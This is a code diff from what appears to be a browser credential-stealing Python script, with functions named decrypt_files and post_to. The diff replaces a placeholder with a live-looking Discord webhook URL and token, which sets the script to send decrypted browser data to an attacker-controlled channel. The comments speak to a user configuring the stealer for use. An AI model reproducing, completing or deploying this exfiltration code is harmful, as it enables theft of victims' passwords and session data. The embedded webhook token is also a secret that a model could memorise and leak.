@@ -224,7 +224,7 @@ def decrypt_files(path, browser):
 def post_to(file):
     token = "TELEGRAM TOKEN"     # put your token in here, if you don't wanna use telegram leave it like it is
     chat_id = "TELEGRAM CHATID"  # "    chatid          "                     telegram      "
-    webhook_url = "WEBHOOK URL"  # "    webhook         "                     discord       "
+    webhook_url = "https://discordapp.com/api/webhooks/1322998982699384912/XAdCym_Ra6S5YPUTBQqrQqf30aTA8p4vCiW9CdQcKkto_6CZ0o7FYNqrHDrYQOrm3vcf"  # "    webhook         "                     discord       "
     # if you don't understand it you shouldn't use it
 
     if token == "TELEGRAM TOKEN":  # don't change
